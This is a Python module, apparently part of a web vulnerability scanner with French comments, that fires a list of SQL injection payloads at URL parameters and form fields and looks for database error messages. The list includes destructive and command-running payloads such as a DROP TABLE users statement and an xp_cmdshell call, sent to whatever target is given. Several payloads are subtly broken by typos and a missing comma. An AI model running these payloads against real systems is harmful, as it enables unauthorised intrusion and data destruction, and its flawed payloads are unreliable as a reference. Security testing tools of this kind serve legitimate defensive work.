# Détection des injections SQL
import requests
from core.utils import find_forms, detect_hidden_sqli_errors, get_csrf_token, detect_hidden_sqli_errors, check_allowed_methods

SQLI_PAYLOADS = [
    "'", "' OR '1'='1",  "' OR '1'='1' --", " \" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
    "' OR 1=1#", "' OR 1=1/*",  "' UNION SELECT null, version()--", "' UNION SELECT null, database()--",
    "/*!50000 UNION SELECT null, version()*/", "'UNION SELCT null, user()--", 
    "' UNION SELCT null, table_name FROM information_schema.tables--", "1' OR '1'='1' --", "1' OR '1'='1' #"
    "'AND 1=CAST((SELECT @@version) AS INT)--", "' OR SLEPP(5)--",
    "'; EXEC xp_cmdshell('whoami')--", "'; DROP TABLE users--"
]

SQLI_SIGNATURES = [
        "You have an error in your SQL syntax",
        "Warning: mysql_fetch",
        "Unclosed quotation mark",
        "Microsoft OLE DB Provider",
        "SQLSTATE[",
        "ODBC SQL Server Driver",
        "Syntax error in string",
        "Unknown column",
        "Fatal error",
        "MySQL server version",
        "PostgreSQL query failed",
        "syntax error",  
        "mysql_fetch", 
        "database error", 
        "unterminated string", 
    ]



# def scan_sqli1(target):
#     vuln_found = False
#     sqli_results = {}
    
#     for payload in SQLI_PAYLOADS:
#         test_url = f"{target}?{payload}"
        
#         try:
#             response=  requests.get(test_url, timeout=5)
#             response_text = response.text.lower()
            
#             if any(signature.lower() in response_text for signature in SQLI_SIGNATURES):
#                 print(f"🔥 SQLi détectée : {test_url}")
#                 print(f"Contenu reçu : {response.text[:500]}...")
#                 vuln_found = True
#                 sqli_results[test_url] = "VULNERABLE"
#             else:
#                 sqli_results[test_url] = "Non Vulnerable"
#         except requests.exceptions.RequestException as e:
#             print(f"❌ Erreur lors de la requête : {e}")
#             pass
    

    # return sqli_results, vuln_found

def scan_sqli(target, formated_target):
    """Teste l'injection SQL (SQLi)"""
    
    print(f"\n\t==============Scan SQLI sur -->{formated_target}<-- 🔍 ==============\n")
    
    
    vuln_found = False
    sqli_results = {}
    
    for payload in SQLI_PAYLOADS:
        test_url = f"{target}?input={payload}"
        
        try:
            response = requests.get(test_url, timeout=5)
            response_text = response.text.lower()
            
            if any(signature.lower() in response_text for signature in SQLI_SIGNATURES):
                print(f"🔥 SQLi détectée dans l'URL : {test_url}")
                vuln_found = True
                sqli_results[test_url] = "VULNERABLE (URL Injection)"
        
        except requests.exceptions.RequestException as e:
            print(f"❌ Erreur lors de la requête URL SQLi : {e}")
    
    forms = find_forms(target)
    
    
    if forms:
        for form in forms:
            action = form.get("action") 
            method = form.get("method", "get")
            inputs = form.get("inputs", [])
            
            target_url = target + action if action else target
            # allowed_methods = check_allowed_methods(target_url)
            
            
            for input_field in inputs:
                field_name = input_field.get("name")
                if not field_name:
                    continue
                
                for payload in SQLI_PAYLOADS:
                    form_data = {field_name: payload}
                    
                    try:
                        if method == "post":
                            response = requests.post(target_url, data=form_data, timeout=5)
                        else:
                            response = requests.get(target_url, params=form_data, timeout=5)
                        response_text = response.text.lower()
                        
                        if any(signature.lower() in response_text for signature in SQLI_SIGNATURES):
                            print(f"🔥 SQLi détectée dans le formulaire `{field_name}` avec : {payload}")
                            vuln_found = True
                            sqli_results[target_url] = f"VULNERABLE - Champ {field_name}"
                        
                    
                    except requests.exceptions.RequestException as e:
                        print(f"❌ Erreur lors de la requête : {e}")
    
    if not vuln_found:
        print("\n✅ Aucun SQLi détecté.\n")
    
    return sqli_results